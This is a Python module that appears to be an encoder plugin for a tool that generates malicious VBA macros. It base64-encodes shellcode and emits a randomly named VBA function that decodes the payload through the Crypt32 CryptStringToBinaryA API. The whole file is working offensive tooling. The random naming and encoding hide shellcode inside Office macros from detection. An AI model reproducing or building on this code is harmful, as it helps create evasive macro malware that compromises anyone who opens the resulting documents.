import base64
import random
import string


class Base64Encode:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return ['Private Declare PtrSafe Function CryptStringToBinaryA Lib "Crypt32.dll" (ByVal pszString As String, ByVal cchString As Long, ByVal dwFlags As Long, ByVal pbBinary As LongPtr, ByRef pcbBinary As Long, ByRef pdwSkip As Long, ByRef pdwFlags As Long) As Long']
    
    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> str:
        return base64.b64encode(decoded).decode()

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
Public Function {self.name}(ByVal encoded As String) As Byte()

    Dim dwFlagsIn As Long, dwFlagsOut As Long, dwSkip As Long
    Dim cbBinary As Long, cchString As Long, lastErr As Long
    Dim decoded() As Byte
    Dim result As Boolean

    dwFlagsin = &H1&
    cchString = Len(encoded)

    ' --- Pass 1: pbBinary = NULL, so the API just reports the size it needs ---
    result = CryptStringToBinaryA(encoded, cchString, dwFlagsIn, 0&, cbBinary, dwSkip, dwFlagsOut)

    ReDim decoded(0 To cbBinary - 1)

    ' --- Pass 2: cbBinary is in/out - buffer size in, bytes written out ---
    result = CryptStringToBinaryA(encoded, cchString, dwFlagsIn, VarPtr(decoded(0)), cbBinary, dwSkip, dwFlagsOut)

    ' Trim in case the API wrote fewer bytes than it originally asked for.
    If cbBinary < UBound(decoded) + 1 Then ReDim Preserve decoded(0 To cbBinary - 1)

    {self.name} = decoded
End Function
"""            